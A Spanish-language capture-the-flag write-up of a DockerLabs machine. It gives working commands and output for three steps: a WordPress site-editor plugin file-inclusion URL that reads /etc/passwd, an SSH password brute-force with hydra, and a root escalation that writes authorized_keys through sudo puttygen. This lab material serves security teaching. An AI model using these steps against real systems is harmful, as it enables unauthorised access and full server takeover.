---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Medio
VectorInicial: LFI en plugin vulnerable de WordPress (site-editor <= 1.1.1)
Privesc: Abuso de sudo NOPASSWD con puttygen para escribir authorized_keys de root
Fecha: 2026-02-12
---
<img width="913" height="530" alt="Pasted image 20260211154801" src="https://github.com/user-attachments/assets/3af77b1c-72e2-42e3-845d-dae5b840d97d" />

Lo primero que realizaremos sera un escaneo para identificar puertos y servicios abiertos:

```bash
 settarget 172.17.0.2
TARGET establecido: 172.17.0.2

 gomap -s $TARGET
🎯 Scanning 172.17.0.2 (997 ports)

 PORT    STATE  SERVICE      VERSION
22 open ssh SSH-2.0 - OpenSSH 9.2p1
80 open http 
```

Vemos que tenemos 2 puertos abiertos:
* Puerto 22 para conexiones por SHH
* Puerto 80 de servicio web

Empecemos por la web a ver que tenemos.

<img width="1797" height="826" alt="Pasted image 20260211161159" src="https://github.com/user-attachments/assets/9d649832-8f02-4d82-8aa3-2d7df3d445b6" />

Nos encontramos con la pagina mal maquetada y sin imágenes, por consiguiente pasaremos el ratón por encima de algún enlace para ver si hay dominio al que apunten o usando CTR+U para ver el código de la web y comprobarlo.

<img width="1260" height="608" alt="Pasted image 20260211161716" src="https://github.com/user-attachments/assets/33bc3963-84ec-43d4-905e-886bac2d0191" />

Efectivamente necesitamos indicar en nuestro **/etc/hosts** el dominio de esta web

```bash
 sudo nano /etc/hosts

 cat /etc/hosts                             
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   jd-sec.intracof.local   jd-sec
   3   │ 
   4   │ # The following lines are desirable for IPv6 capable hosts
   5   │ ::1     localhost ip6-localhost ip6-loopback
   6   │ ff02::1 ip6-allnodes
   7   │ ff02::2 ip6-allrouters
   8   │ 
   9   │ 172.17.0.2 asucar.dl
───────┴─────────────────────────────────────────────────────────────────────────
```

Ahora al entrar por la url http://asucar.dl podremos ver la web, con algunos errores pero ya en condiciones.

Al navegar por la web no encontramos ningún dato útil que nos pueda servir, solo tienen una entrada típica de la primera instalación:

<img width="605" height="220" alt="Pasted image 20260211164454" src="https://github.com/user-attachments/assets/513b5d42-6bbb-46de-8546-03737ea7f696" />

Ahora usaremos una herramienta para el reconocimiento de usuarios y plugins para ver si encontramos algo interesante.

```bash
 wpscan --url http://asucar.dl -e u,p
```

Con el **-e** indicamos que queremos realizar un enumeración de *usuarios* y *plugins* obteniendo el siguiente resultado:

```bash
[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.5.7
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.5.7
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://asucar.dl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt

[i] User(s) Identified:

[+] wordpress
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://asucar.dl/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

El usuario que identificamos en la entrada es el único que encontramos en la enumeración, pero en los plugins vemos que tenemos **site-editor** que es vulnerable a un **LFI**.

Buscando en Internet este plugin y su versión damos con el CVE-2018-7422 el cual nos servira para ver los usuarios del */etc/passwd*, solo tenemos que poner en la url lo siguinete:

```html
http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

De esta manera podremos ver todos los usuarios del sistema.

```txt
|root:x:0:0:root:/root:/bin/bash|
|daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin|
|bin:x:2:2:bin:/bin:/usr/sbin/nologin|
|sys:x:3:3:sys:/dev:/usr/sbin/nologin|
|sync:x:4:65534:sync:/bin:/bin/sync|
|games:x:5:60:games:/usr/games:/usr/sbin/nologin|
|man:x:6:12:man:/var/cache/man:/usr/sbin/nologin|
|lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin|
|mail:x:8:8:mail:/var/mail:/usr/sbin/nologin|
|news:x:9:9:news:/var/spool/news:/usr/sbin/nologin|
|uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin|
|proxy:x:13:13:proxy:/bin:/usr/sbin/nologin|
|www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin|
|backup:x:34:34:backup:/var/backups:/usr/sbin/nologin|
|list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin|
|irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin|
|_apt:x:42:65534::/nonexistent:/usr/sbin/nologin|
|nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin|
|systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin|
|mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false|
|systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin|
|messagebus:x:101:102::/nonexistent:/usr/sbin/nologin|
|sshd:x:102:65534::/run/sshd:/usr/sbin/nologin|
|curiosito:x:1000:1000::/home/curiosito:/bin/bash|
|{"success":true,"data":{"output":[]}}|
```

En este listado encontramos un usuario llamado ***curiosito*** el cual podremos usar desde **ssh** para intentar el acceso mediante *hydra*.

```bash
 hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 17:05:02
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-11 17:05:22
```

Ya hemos obtenido un usuario para una conexión por **ssh** ahora nos conectaremos y empezaremos la escalada de privilegios.

```bash
 ssh curiosito@$TARGET      
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:uxPuaJueTWTbzOOOgHR9jKEuKfQzpWt1rU8JihuRr4o
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
curiosito@172.17.0.2's password: 
Linux 988e23ca99ad 6.18.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.5-1kali1 (2026-01-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
curiosito@988e23ca99ad:~$
```

```bash
curiosito@988e23ca99ad:~$ sudo -l                                                                                                                          
Matching Defaults entries for curiosito on 988e23ca99ad:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User curiosito may run the following commands on 988e23ca99ad:
    (root) NOPASSWD: /usr/bin/puttygen
```

Vemos que hay un binario que podemos usar para intentar una escalada, pero antes comprobaremos la web de https://gtfobins.org/ pero no encontramos resultados así que tendremos que buscar otra forma.

```bash
curiosito@988e23ca99ad:~$ find / -perm 4000 2>/dev/null
```

Intentamos la búsqueda de binarios con *suid* sin resultados.

Pero viendo que podemos ejecutar ***puttygen*** como **root** podremos creamos unas credenciales para conectarnos por *ssh* y así tener acceso al **root**.

Primero generamos una clave privada

```bash
curiosito@988e23ca99ad:~$ ssh-keygen -t rsa -b 4096 -f /tmp/asucar -N ""
```

Ahora convertiremos la clave privada con **puttygen** para añadirla al *root*

```bash
sudo puttygen /tmp/asucar \
  -O public-openssh \
  -o /root/.ssh/authorized_keys
```

Ahora tendríamos que poder entrar como **root** sin contraseña.

```bash
curiosito@78285efe6287:~$ ssh -i /tmp/asucar root@127.0.0.1                                                                                                
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:uxPuaJueTWTbzOOOgHR9jKEuKfQzpWt1rU8JihuRr4o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux 78285efe6287 6.18.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.5-1kali1 (2026-01-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@78285efe6287:~# ls
root@78285efe6287:~# whoami
root
root@78285efe6287:~# pwd
/root
root@78285efe6287:~#
```

Con esto ya tendríamos  comprometida la maquina.

## Conclusión

Este laboratorio demuestra cómo una **mala gestión de plugins en WordPress** puede derivar en una cadena completa de compromiso del sistema.  
Una vulnerabilidad aparentemente limitada como un **LFI** permite la enumeración de usuarios, lo que combinado con **credenciales débiles** da acceso inicial al sistema.

Posteriormente, una **configuración insegura de sudo**, permitiendo ejecutar binarios sensibles como `puttygen` sin contraseña, facilita una escalada de privilegios limpia y silenciosa hasta **root**.

### Puntos clave aprendidos

- La importancia de mantener **plugins y CMS actualizados**.
- El impacto real de un **LFI** bien aprovechado.    
- El riesgo de conceder permisos `NOPASSWD` a binarios no controlados.
- Cómo el abuso de **authorized_keys** sigue siendo una técnica muy efectiva en entornos mal configurados.

---
Si te gusto puedes invitarme a un cafe.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
